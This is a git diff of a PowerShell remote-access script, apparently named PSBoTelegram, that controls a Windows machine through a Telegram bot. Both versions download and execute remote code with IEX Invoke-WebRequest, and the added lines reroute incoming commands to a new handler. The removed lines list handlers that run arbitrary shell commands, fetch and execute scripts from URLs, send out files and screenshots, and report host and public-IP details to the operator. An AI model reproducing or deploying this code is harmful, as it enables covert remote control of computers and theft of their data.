@@ -1,6 +1,6 @@
 clear
 $ErrorActionPreference = "SilentlyContinue"
-$version = "0.2"
+$version = "0.3"
 
 $banner = "    ____  _____ ____      ______     __                              
    / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
@@ -38,10 +38,9 @@ param (
 [string]$bot_Master_ID = "your_chat_id",
 [int]$delay = "your_delay"
 )
-IEX (Invoke-WebRequest "https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Functions.ps1").content
+IEX (Invoke-WebRequest "https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Functions.ps1").content 
 $chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ; $bot = [string]$bot[3] ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" 
 [int]$first_connect = "1"
-$help = "PSBoTelegram V0.2`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot"
 while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
     $l = $json.result.length
 	$i = 0
@@ -49,20 +48,8 @@ if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mens
 	while ($i -lt $l) {
 		$offset = $json.result[$i].update_id + 1
         $comando = $json.result[$i].message.text
-Write-Host "$comando"
-
- if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
- if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Whoami") {$comando = $comando -replace "/","";$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $kill = $true}
- if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Screenshot") {screen-shot -botkey $botkey -chat $chat_id}
- if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
- if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
-
+        Write-Host $comando
+test-command -comando $comando -botkey $botkey -chat_id $chat_id 
    		$i++
 	}
 
